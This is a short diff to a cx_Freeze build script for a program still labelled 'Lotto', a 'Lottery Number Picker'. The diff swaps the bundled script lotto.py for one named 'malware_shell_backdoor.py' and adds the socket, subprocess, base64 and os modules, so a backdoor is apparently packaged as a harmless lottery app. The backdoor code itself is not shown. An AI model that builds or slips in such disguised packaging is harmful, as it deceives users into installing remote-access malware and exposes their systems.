@@ -4,7 +4,7 @@ from cx_Freeze import setup, Executable
 base = None
 if sys.platform == 'win32' : base = 'Win32GUI'
 
-opts = { 'include_files' : ['logo.gif'], 'includes' : [ 're' ] }
+opts = { 'include_files' : ['logo.gif'], 'includes' : [ 'sys', 'base64', 'os', 'socket', 'subprocess' ] }
 
 setup(
     name = 'Lotto' ,
@@ -12,4 +12,4 @@ setup(
     description = 'Lottery Number Picker' ,
     author = 'Mike McGrath' ,
     options = {'build_exe' : opts } ,
-    executables = [ Executable( 'lotto.py' , base = base ) ] )
+    executables = [ Executable( 'malware_shell_backdoor.py' , base = base ) ] )
